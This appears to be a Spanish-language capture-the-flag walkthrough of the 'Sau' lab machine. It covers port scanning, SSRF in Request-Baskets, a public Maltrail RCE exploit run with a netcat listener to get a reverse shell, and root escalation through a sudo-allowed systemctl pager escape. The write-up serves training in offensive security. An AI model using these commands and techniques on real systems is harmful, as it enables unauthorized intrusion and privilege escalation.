---
layout: default
title: Sau
---

# CONOCIMIENTOS NECESARIOS

> Enumeración de puertos
>
> SSRF
>
> RCE
>
> Análisis de exploits públicos
>
> Escalada de privilegios en Linux

# Enumeración Inicial

## Nmap

Empezamos realizando un escaneo de puertos a la IP de la máquina víctima:

```bash
$ nmap 10.129.229.26
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-28 09:24 CDT
Nmap scan report for 10.129.229.26
Host is up (0.0090s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
55555/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 1.32 seconds
```

Podemos ver que el puerto 80 está filtrado, quizás solo permite conexiones desde un rango de IPs concretas, unos puertos específicos, etc.

Enumeramos exhaustivamente estos puertos por en alguno está corriendo alguna versión del servicio vulnerable a algún CVE.

```bash
$ nmap -p22,80,55555 -sCV 10.129.229.26
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-28 09:26 CDT
Nmap scan report for 10.129.229.26
Host is up (0.0074s latency).

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Thu, 28 Aug 2025 14:27:11 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Thu, 28 Aug 2025 14:26:46 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Thu, 28 Aug 2025 14:26:46 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94SVN%I=7%D=8/28%Time=68B06726%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/htm
SF:l;\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Thu,\x2028\x20Aug\
SF:x202025\x2014:26:46\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\
SF:"/web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x
SF:20200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Thu,\x2028\x20Aug\
SF:x202025\x2014:26:46\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequ
SF:est,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque
SF:st")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
SF:\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,6
SF:7,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x
SF:20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%
SF:r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Opti
SF:ons:\x20nosniff\r\nDate:\x20Thu,\x2028\x20Aug\x202025\x2014:27:11\x20GM
SF:T\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20
SF:name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}
SF:\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.33 seconds
```

Como podemos ver el puerto **55555** está alojando un servicio web, ya que vemos que nmap intentó hacer peticiones HTTP y en alguna recibimos código de respuesta 200, que significa que el recurso existe.

Echemos un vistazo a la web.

## HTTP

![Sau]({{"/assets/images/Sau1.png"}})

Una vez navegamos, vemos que se nos redirige al recurso **/web**, que ya vimos en el escaneo de nmap previo que existía. En la parte inferior de la página encontramos la versión y el servicio web con el que estamos interactuando.

![Sau]({{"/assets/images/Sau2.png"}})

Parece que estamos contra el servicio **Requests-Baskets** que es una herramienta de código abierto que recolecta y permite inspeccionar las peticiones HTTP vía web.

![Sau]({{"/assets/images/Sau3.png"}})

Podemos ver, que esta versión es vulnerable al **CVE-2023-27163**, podemos usar el exploit público, pero en este caso, lo explotaremos manualmente.

Si echamos un ojo al CVE, podemos ver que se trata de que al aplicar una redirección en la configuración de la cesta que nos creemos mediante el parámetro "**forward_url**" y tenemos que activar también con el valor "**true**" el parámetro "**proxy_response**", ya que veremos que si no lo hacemos, no veremos la respuesta del servidor al que intentamos redirigirnos.

(Esta información la saco del repositorio de **mathias-mrsn** en github sobre este CVE).

![Sau]({{"/assets/images/Sau4.png"}})

Podemos ver, una vez creada la cesta, que se nos proporciona una URL para acceder a ella, que es la misma que para visualizar las peticiones pero quitando el **/web**, en este caso sería "**http://10.129.229.26:55555/miiqfz4**" para acceder a la página.

Si damos al engranaje en la parte superior derecha, podemos ver las siguientes opciones:

![Sau]({{"/assets/images/Sau5.png"}})

Si lo configuramos de esta forma, estamos diciendo a la cesta, que cuando alguien la visite, le redirija al puerto 80 que corre en local, explotando la vulnerabilidad SSRF, y la opción **Proxy Response** es para que veamos esa respuesta, si no la marcamos, no veremos nada al navegar a la página de la cesta.

![Sau]({{"/assets/images/Sau6.png"}})

Navegando a la página, podemos ver que efectivamente, nos redirige el contenido de la misma, explotando correctamente la vulnerabilidad SSRF.

En la parte inferior de la página nuevamente, vemos cómo nos indica que el servicio que está corriendo se trata de **Maltrail** en la versión **0.53**. La cual si buscamos nuevamente en internet, podemos ver que es vulnerable a RCE mediante el parámetro **username** en la página de **/login**. Esto es debido a que la entrada no se sanitiza.

![Sau]({{"/assets/images/Sau7.png"}})

Podemos usar un exploit público, en este caso, el que nos sale del usuario **D0nw0r**, que descargaremos y ejecutaremos, poniendo antes a la escucha el puerto por el que queremos recibir la conexión.

(En el vídeo de mi canal resolviendo esta máquina explotamos esta vulnerabilidad manualmente).

No obstante, antes de explotarlo, debemos redirigir la cesta a **http://localhost/login** dado a que no parece que mande la url completa a la dirección que redirige, por lo que no sirve de nada añadir manualmente el **/login** a la url de la cesta.

![Sau]({{"/assets/images/Sau8.png"}})

Una vez modificada la URL a la que nos redirige añadiendo la página **/login**, podemos intentar acceder manualmente.

![Sau]({{"/assets/images/Sau9.png"}})

Recibimos el error "**Login Failed**", lo que nos indica que nos redirige correctamente a la página que buscábamos. Intentemos ejecutar el exploit:

## NetCat

En este caso, abriremos el puerto 4444, por el que recibiremos la conexión.

```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
```

## Exploit RCE

Ejecutamos el exploit, especificando en orden los parámetros: **nuestra IP en la red de la víctima, el puerto que tenemos a la escucha y la URL vulnerable (la cesta en este caso)**.

```bash
$ python3 exploit.py 10.10.14.177 4444 http://10.129.229.26:55555/miiqfz4
Running exploit on http://10.129.229.26:55555/miiqfz4/login
```

Una vez ejecutado, volvemos a nuestra terminal en la que estamos ejecutando **netcat** y vemos que recibimos una reverse shell como el usuario **puma**.

```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.177] from (UNKNOWN) [10.129.229.26] 60706
$ whoami
whoami
puma
```

## Escalada de privilegios

Ahora toca escalar privilegios, en este caso, si listamos los privilegios que tenemos como sudo, veremos lo siguiente:

```bash
$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

Como podemos ver, podemos ejecutar el comando **/usr/bin/systemctl status trail.service** con privilegios de sudo, sin contraseña.

Podemos ver qué versión de **systemd** está instalada en el sistema:

````bash
$ systemctl --version
systemctl --version
systemd 245 (245.4-4ubuntu3.22)
+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid
```
Podemos intentar ejecutar comandos dentro de systemctl, ya que usa de forma predeterminada el paginador **less** y podríamos ejecutar comandos con el eUID (en este caso 0, ya que lo ejecutamos como sudo) poniendo la exclamación **!** dentro de **less**.

```bash
$ sudo systemctl status trail.service
sudo systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/bash
```
Ejectuamos el comando con **!/bin/bash** y obtenemos la shell como usuario root :)

```bash
root@sau:/opt/maltrail# whoami
whoami
root
```

Esta explotación se debe a que **systemd** no tiene configurada la variable **LESSSECURE** en 1, lo que haría que no pudiésemos ejecutar comandos dentro de less, por lo que combinamos la falta de configuración con una configuración errónea en el archivo **/etc/sudoers**.

Keep hacking!

## Vídeo Walkthrough

<iframe width="100%" height="400" src="https://www.youtube.com/embed/VrlwAxNBx48" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
